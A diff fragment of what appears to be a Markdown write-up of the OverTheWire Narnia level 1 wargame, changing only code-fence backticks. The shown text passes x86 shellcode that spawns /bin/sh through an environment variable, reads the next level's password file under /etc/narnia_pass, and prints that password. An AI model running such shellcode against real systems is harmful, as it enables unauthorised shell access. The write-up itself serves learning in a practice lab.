@@ -246,13 +246,13 @@ narnia1@narnia:/tmp/ww$ echo $EGG
 Running narnia1 doesn't segfault, but wait...it asks me to provide something to EGG. So it doesn't pick up my environment variable. Hmmm...
 
 That is annoying, but further investigation shows that you can actually pass environment variables into a program on the command line:
-``
+```
 narnia1@narnia:/narnia$ EGG=$(perl -e 'print "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"') ./narnia1
 Trying to execute EGG!
 $ whoami
 narnia2
 $ cat /etc/narnia_pass/narnia2
-``
+```
 <details><summary>Password</summary>
 	<p>	
 nairiepecu
